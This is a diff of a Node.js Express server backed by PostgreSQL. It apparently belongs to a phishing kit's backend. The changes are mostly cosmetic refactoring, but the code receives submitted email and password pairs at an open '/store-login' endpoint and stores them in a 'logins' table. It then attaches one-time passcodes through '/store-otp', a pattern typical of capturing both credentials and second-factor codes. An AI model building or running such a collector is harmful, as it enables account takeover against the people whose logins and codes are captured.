@@ -9,8 +9,6 @@ const PORT = process.env.PORT || 5000;
 // Middleware
 app.use(cors());
 app.use(express.json());
-
-// Logger
 app.use((req, res, next) => {
   console.log(new Date().toISOString(), req.method, req.url);
   next();
@@ -19,11 +17,11 @@ app.use((req, res, next) => {
 // PostgreSQL pool
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
-  ssl: { rejectUnauthorized: false }
+  ssl: { rejectUnauthorized: false },
 });
 
-// Create single table
-const createTables = async () => {
+// Create table if it doesn't exist
+const createTable = async () => {
   try {
     await pool.query(`
       CREATE TABLE IF NOT EXISTS logins (
@@ -34,7 +32,7 @@ const createTables = async () => {
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );
     `);
-    console.log("Single table ready ✅");
+    console.log("Table 'logins' ready ✅");
   } catch (err) {
     console.error("Error creating table:", err);
     process.exit(1);
@@ -42,9 +40,7 @@ const createTables = async () => {
 };
 
 // Routes
-app.get("/", (req, res) => {
-  res.send("Server is running!");
-});
+app.get("/", (req, res) => res.send("Hello World"));
 
 app.post("/store-login", async (req, res) => {
   const { email, password } = req.body;
@@ -72,12 +68,10 @@ app.post("/store-otp", async (req, res) => {
       "UPDATE logins SET otp=$1 WHERE email=$2 RETURNING *",
       [otp, email]
     );
+    if (result.rowCount === 0)
+      return res.status(400).json({ success: false, error: "No login found" });
 
-    if (result.rowCount === 0) {
-      return res.status(400).json({ success: false, error: "No login found for this email" });
-    }
-
-    console.log("OTP updated for email:", email);
+    console.log("Saved OTP for email:", email);
     res.json({ success: true });
   } catch (err) {
     console.error("DB error:", err);
@@ -87,9 +81,9 @@ app.post("/store-otp", async (req, res) => {
 
 // Start server
 const startServer = async () => {
-  await createTables();
+  await createTable();
   app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server started on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
   });
 };
 
